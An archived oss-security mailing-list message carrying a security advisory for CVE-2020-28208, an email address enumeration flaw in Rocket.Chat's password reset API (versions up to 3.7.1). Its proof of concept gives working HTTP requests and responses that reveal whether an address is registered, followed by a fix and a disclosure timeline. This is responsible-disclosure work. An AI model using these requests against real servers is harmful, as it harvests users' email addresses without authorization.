X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5115" "Thursday" "7" "January" "2021" "16:45:48" "+0000" "Stefan Pietsch" "s.pietsch@trovent.io" "<xruvR7mNefMgnPSDcQHi8D4x11IH398iLrOkXxNz32ze9DqlhfN5xuyS0DOChRmxszawewy5CWK2O_PCUGQ0eU63mGRAJvqlIXs2kQxmMAc=@trovent.io>" "169" "[oss-security] Trovent Security Advisory 2010-01 / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" nil nil nil "1" "2021010716:45:48" "[oss-security] Trovent Security Advisory 2010-01 / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" (number mark "U       s.pietsch@tr Jan  7  169/5115  " thread-indent "\"[oss-security] Trovent Security Advisory 2010-01 / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Trovent Security Advisory 2010-01 / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 17433 invoked by uid 550); 7 Jan 2021 17:22:15 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5493 invoked from network); 7 Jan 2021 16:46:02 -0000
Date: Thu, 07 Jan 2021 16:45:48 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=trovent.io;
	s=protonmail2; t=1610037950;
	bh=6s21DxdGI7J310BLRmyv6dy4IydKYnSyAu94WyiiZAE=;
	h=Date:To:From:Reply-To:Subject:From;
	b=CGxofUsFmz88DE843kGUuJ4mfvMyJpghyrF87FjDXSplKa1xD25dAx4GuNwnasIxV
	 VYs9fvZIGXB3BYPHE2CFKTLzITxfub0f/3ZLEAadQsX/V7XntPc06wClRrQliXG9/Z
	 wo4Mbw78lhjH1tkjGulm4YJhhvY+IhMS6Lc70g3VlqJMIQmh87/uV6OMMrDku7bpuL
	 fQIv9VJOPwcTV2XGkQ5kYx4m5+wjnOTPD/8NnIRpIDKNbLPXV0su9KAbfJnXAEEUUw
	 twOibSs+AqCJsfGywp6SDCgutriqXa+0mDcB2uYqdnxwEguKV7HNr9TPwPHUTURdS8
	 ZtlLqNfcJ1abg==
To: "fulldisclosure@seclists.org" <fulldisclosure@seclists.org>, "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>, "submissions@packetstormsecurity.com" <submissions@packetstormsecurity.com>
From: Stefan Pietsch <s.pietsch@trovent.io>
Message-ID: <xruvR7mNefMgnPSDcQHi8D4x11IH398iLrOkXxNz32ze9DqlhfN5xuyS0DOChRmxszawewy5CWK2O_PCUGQ0eU63mGRAJvqlIXs2kQxmMAc=@trovent.io>
MIME-Version: 1.0
Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha256; boundary="---------------------a0045f27396069c44aafdec01bdd7c1d"; charset=utf-8
Subject: [oss-security] Trovent Security Advisory 2010-01 / CVE-2020-28208: Rocket.Chat email address enumeration vulnerability

-----------------------a0045f27396069c44aafdec01bdd7c1d
Content-Type: multipart/mixed;boundary=---------------------3a030728afa836a510b570f792727d48

-----------------------3a030728afa836a510b570f792727d48
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain;charset=utf-8

# Trovent Security Advisory 2010-01 #
#####################################


Email address enumeration in reset password
###########################################


Overview
########

Advisory ID: TRSA-2010-01
Advisory version: 1.0
Advisory status: Public
Advisory URL: https://trovent.io/security-advisory-2010-01
Affected product: Web application Rocket.Chat
Affected version: <=3D 3.7.1
Vendor: Rocket.Chat Technologies Corp., https://rocket.chat
Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch


Detailed description
####################

Trovent Security GmbH discovered an email address enumeration vulnerability
in the password reset function of the chat application Rocket.Chat. This vu=
lnerability lets
an unauthorized user enumerate registered email addresses on the instance o=
f Rocket.Chat.

Severity: Medium
CVSS Score: 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
CVE ID: CVE-2020-28208
CWE ID: CWE-204


Proof of concept
################

Sample HTTP request sent with a registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 122
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"pa=
rams\":[\"positive@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~

The server response to a valid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:01:25 GMT
Connection: keep-alive
Content-Length: 78

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":true}","success":tr=
ue}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~

Sample HTTP request sent with a non registered email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~
POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
Host: localhost:3000
Content-Length: 119
Accept: */*
Content-Type: application/json


{"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"pa=
rams\":[\"false@test.de\"],\"id\":\"3\"}"}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~

The server response to an invalid email address:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~
HTTP/1.1 200 OK
X-XSS-Protection: 1
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-Instance-ID: DQDfuEfNLdbZr3zYH
Cache-Control: no-store
Pragma: no-cache
content-type: application/json
Vary: Accept-Encoding
Date: Tue, 03 Nov 2020 12:03:08 GMT
Connection: keep-alive
Content-Length: 79

{"message":"{\"msg\":\"result\",\"id\":\"3\",\"result\":false}","success":t=
rue}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


Solution / Workaround
#####################

Ensure the application returns consistent generic server responses independ=
ent
of the email address entered during the password reset process.


History
#######

2020-10-27: Vulnerability found
2020-11-03: Advisory created and CVE ID requested
2020-11-06: Vendor contacted and informed about planned disclosure date
2020-11-06: Vendor confirmed vulnerability, working on a fix
2021-01-07: Advisory published

-----------------------3a030728afa836a510b570f792727d48--

-----------------------a0045f27396069c44aafdec01bdd7c1d
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: ProtonMail

wsFzBAEBCAAGBQJf9zqhACEJEM8er/4ehY63FiEE0wArIZvu5AKY9ZSXzx6v
/h6FjrfDDRAAiXLFgqps4pe5GSJ01xfIJ2AL/UxfQnDbef97Qhsm61Q94g5z
+pVZTnAXKT5+P6OS9rRj6i8H+GuoiFj/xX+DA0HKYxzoOOi0WlLfFhd1Xddm
F2lEJvdZ6i1Hdw3+ZzSoPMxK+WvKlQFOfdngGnfe6uOb1dRcXHug8rjKHxpm
LDYu3WUes3REk2ue8qeVpigso0YRyHwJMC9GyGG2AgAGXIlgOXwuRuOAZYo/
2aHreh3MNHhGu3Rrklx1FMkEAhaPb1u6wiWi+EpsbQzJSQxtM3wcSzAvXJ7c
+NbQW/QW9YYJWfXvH2Wy2qsebwNuhzPYepimdwcArDfxRCd8LzrlypoUGq90
K5I7YdJZ5p75FvteKzPbwxEpw50ArT7E8KQPkrCabFd29YXSB3CB/EHd645d
9ah5mZS5fO2Q3PCRiVqAFs3mNb20OHbrJxBgLyB3ig7Nirbbw6K8I96DrTDM
xxaqAMVnFf50XQW4JDqjmhlxjSV0UvI4Pn7ykUhmWkh/5DAOp7SV6BEQGPpX
htTcBxiKgUuV0JscxS8Y4DXmtKLQnzUyiragOVMXq+Y/z6Bqfcrb6Hrn0WcZ
5PWtj0+BuyfOKkA1kEcsyUUqcxIU+R4gA0ubpko/ssnzn076GJ2LsOgmSVE9
wa1kEQ2FrI/3PSlVzsvmUurYO9kZfzUWJTw=
=jOqN
-----END PGP SIGNATURE-----


-----------------------a0045f27396069c44aafdec01bdd7c1d--

